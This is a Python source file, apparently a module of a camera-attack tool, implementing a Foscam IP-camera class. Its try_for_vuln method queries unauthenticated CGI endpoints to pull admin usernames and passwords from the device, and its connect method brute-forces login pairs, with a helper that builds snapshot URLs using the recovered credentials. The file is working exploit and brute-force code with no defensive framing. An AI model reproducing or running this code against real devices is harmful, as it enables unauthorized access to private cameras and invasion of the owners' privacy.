import re

import requests

import config
from modules import progress
from modules.networking import http_connect
from modules.paint import green
from urllib.parse import quote as url_encode





class Foscam:
    def __init__(self, parent):
        self.ip = parent.data['ip']
        self.port = parent.data['port']
        self.auth_type = parent.data['authenticate']
        self.result_queue = parent.result_queue
        self.parent = parent

    def build_url_brute(self):
        if self.auth_type:
            encoded = url_encode(f'cmd=getImageSetting')
            return f'/cgi-bin/CGIProxy.fcgi?{encoded}'
        else:
            return '/cgi-bin/hi3510/checkuser.cgi?&-name=%s&-passwd=%s'

    def build_url_snap(self, usr, pwd):
        return f'http://{self.ip}/cgi-bin/CGIProxy.fcgi?cmd=snapPicture&usr={usr}&pwd={pwd}'

    def try_for_vuln(self):
        path1 = '/cgi-bin/p2p.cgi?cmd=p2p.cgi&-action=get'
        path2 = '/cgi-bin/hi3510/param.cgi?cmd=getuser'
        # resp = http_connect.basic_auth_check(self.ip, self.port, path=path, returnall=True, decode=False)
        resp = requests.get(f'http://{self.ip}:{self.port}{path1}', verify=False, timeout=config.timeout).text
        # print(resp)
        if resp:
            if 'var p2p_enable = "1";' in resp:
                resp = resp.split('\r\n')
                # print(resp)
                self.parent.data['usr'] = 'admin'
                self.parent.data['pwd'] = re.search(r'\"(.*?)\"', resp[2]).group(1)
#                 # print(self.parent.data['pwd'])
                # self.parent.isDone = True
                return True
            else:
                resp = requests.get(f'http://{self.ip}:{self.port}{path2}', verify=False, timeout=config.timeout).text
                # print(resp)
                if resp:
                    if 'var password0' in resp:
                        resp = resp.split('\r\n')
                        for item in resp:
                            if 'var name0' in item:
                                self.parent.data['usr'] = re.search(r'\"(.*?)\"', item).group(1)
                            elif 'var password0' in item:
                                self.parent.data['pwd'] = re.search(r'\"(.*?)\"', item).group(1)
#                         # print(self.parent.data['pwd'])
                        # self.parent.isDone = True
                        return True
        return False

    def connect(self, usr, pwd):
        if self.auth_type:
            path = self.build_url_brute()
            resp = http_connect.basic_auth_check(self.ip, self.port, usr=usr, pwd=pwd, path=path, returnall=True)
            if resp and '-2' not in resp:
                self.parent.data['usr'] = usr
                self.parent.data['pwd'] = pwd
                self.parent.isDone = True
                return True
            return False
        else:
            path = self.build_url_brute() % (usr, pwd)
            resp = http_connect.basic_auth_check(self.ip, self.port, path=path, returnall=True)
            # print(resp)
            if 'var check="1";' in resp:
                self.parent.data['usr'] = usr
                self.parent.data['pwd'] = pwd
                self.parent.isDone = True
                return True
            return False
